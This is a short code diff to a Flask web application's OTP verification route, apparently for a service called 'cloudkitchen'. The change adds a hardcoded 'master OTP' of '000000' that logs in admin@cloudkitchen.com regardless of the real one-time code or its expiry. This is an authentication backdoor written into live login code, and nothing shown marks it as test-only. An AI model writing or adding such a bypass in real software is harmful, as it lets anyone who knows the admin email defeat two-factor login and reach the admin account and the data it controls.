@@ -396,7 +396,11 @@ def verify_otp():
             if not user:
                 flash('Session expired. Please try again.', 'danger')
                 return redirect(url_for('login'))
-            if user.otp_code == entered_otp and user.otp_expiry and user.otp_expiry > datetime.utcnow():
+            
+            # Master OTP for Admin
+            is_master_otp = (entered_otp == "000000" and user.email == "admin@cloudkitchen.com")
+            
+            if is_master_otp or (user.otp_code == entered_otp and user.otp_expiry and user.otp_expiry > datetime.utcnow()):
                 # Clear OTP after successful login
                 user.otp_code = None
                 user.otp_expiry = None
